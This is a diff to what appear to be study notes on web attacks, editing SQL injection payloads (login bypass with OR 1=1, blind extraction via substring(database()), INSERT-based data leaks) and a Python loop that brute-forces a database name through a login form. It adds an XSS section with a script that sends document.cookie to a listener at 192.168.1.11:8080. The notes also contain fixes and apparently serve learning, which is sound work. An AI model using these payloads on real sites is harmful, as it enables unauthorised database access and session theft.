@@ -17,11 +17,11 @@ if (mysqli_num_rows($login) == 0) {
 
 ## Payload
 ```sql
-SELECT * FROM users WHERE username='foo' AND password='bar'
+SELECT * FROM users WHERE username='xzy' AND password='bar'
 
-SELECT * FROM users WHERE username='foo'-- ' AND password='bar'
+SELECT * FROM users WHERE username='xzy'-- ' AND password='bar'
 
-SELECT * FROM users WHERE username='foo' OR 1=1 LIMIT 1 -- ' AND password='bar'
+SELECT * FROM users WHERE username='xzy' OR 1=1 LIMIT 1 -- ' AND password='bar'
 ```
 
 ## FIX 1
@@ -73,9 +73,9 @@ SELECT * FROM posts WHERE id = 99999 UNION SELECT 1, group_concat(column_name), 
 # SQLI BLID
 
 ```sql
-SELECT * FROM users WHERE username='foo' OR database() ='blog' LIMIT 1 -- ' AND password='bar'
+SELECT * FROM users WHERE username='xzy' OR database() ='blog' LIMIT 1 -- ' AND password='bar'
 
-SELECT * FROM users WHERE username='foo' OR BINARY substring(database(), 1, 1) ='b' LIMIT 1 -- ' AND password='bar'
+SELECT * FROM users WHERE username='xzy' OR BINARY substring(database(), 1, 1) ='b' LIMIT 1 -- ' AND password='bar'
 ```
 
 ```python
@@ -86,7 +86,7 @@ url = 'https://'
 
 for i in range(1, 10):
   for c in range(0x20, 0x7f):
-    username = "foo' OR BINARY substring(database(), %d, 1) ='%s' -- " % (i, chr(c))
+    username = "xzy' OR BINARY substring(database(), %d, 1) ='%s' -- " % (i, chr(c))
     password = "xyz"
     form = {'username': username, 'password': password, 'submit': 'Login'}
     response = requests.post(url, data=form)
@@ -122,3 +122,14 @@ INSERT INTO tables (column1, column2) VALUES ('abc', (SELECT group_concat(table_
 INSERT INTO tables (column1, column2) VALUES ('abc', 'def'), (database(), user())-- ', 'def')
 ```
 
+# XSS
+
+```bash
+python -m http.server 8080
+```
+```html
+nice..
+<script>
+new Image().src = "http://192.168.1.11:8080?cookie=" + document.cookie;
+</script>
+```
